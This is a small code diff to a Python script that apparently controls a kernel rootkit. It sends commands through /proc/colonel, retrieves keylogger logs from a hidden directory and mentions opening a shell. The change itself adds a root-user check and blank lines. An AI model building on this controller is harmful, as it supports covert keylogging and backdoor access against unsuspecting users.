@@ -8,6 +8,7 @@ from os import getpid, execl
 
 evlog = "/opt/__col_log/evlog.txt"
 
+
 # Opens and writes commands to /proc/colonel.
 def command(c):
 	f = open("/proc/colonel", "w")
@@ -25,7 +26,7 @@ def keylogs():
 
 
 def main():
-	if len(sys.argv[:]) <= 1:
+	if len(sys.argv[:]) <= 1 or os.geteuid() != 0:
 		print "usage: sudo %s <command>" % sys.argv[0]
 	# will open a shell given the correct command.
 	elif len(sys.argv[:]) > 2:
@@ -35,6 +36,7 @@ def main():
 			keylogs()
 		else:
 			command(sys.argv[1])
+
 
 if __name__ == "__main__":
 	main()
